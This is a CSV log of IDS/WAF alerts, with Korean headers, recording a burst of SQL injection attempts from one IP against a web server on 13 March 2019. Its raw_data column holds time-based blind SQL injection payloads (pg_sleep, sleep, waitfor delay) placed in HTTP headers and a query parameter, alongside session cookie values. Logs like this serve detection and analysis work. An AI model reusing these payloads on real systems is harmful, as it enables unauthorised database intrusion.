장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Client-IP: -1));select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Client-IP: D0I5oKe8';select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Client-IP: FZ5H35JT');select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Client-IP: fHyJG3Hk'));select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Via: EoLPRwlt'));select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: (select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: j5uUpHgl'; waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: WGa6iyTJ');select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-For: 0""XOR(if(now()=sysdate(),sleep(9),0))XOR""Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-For: (select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'""+(select(0)from(select(sleep(9)))v)+""*/#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-For: -1; waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-For: -1); waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-For: 1 waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: 0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: 1mJvSqYz');select pg_sleep(9); --#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.6674"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: 0""XOR(if(now()=sysdate(),sleep(9),0))XOR""Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: 1 waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: rKSquOJV';select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: pWeDJjUm'));select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1%20OR%203*2<(0%2B5%2B560-560)&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1%20OR%203*2>(0%2B5%2B560-560)&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1'%20OR%202%2B699-699-1=0%2B0%2B0%2B1%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1'%20OR%203%2B699-699-1=0%2B0%2B0%2B1%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1));select%20pg_sleep(6);%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: 1 waitfor delay '0:0:3' --#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.6674"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: nwUEkOq6';select pg_sleep(3); --#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.6674"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: HTM49US4'));select pg_sleep(3); --#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.6674"
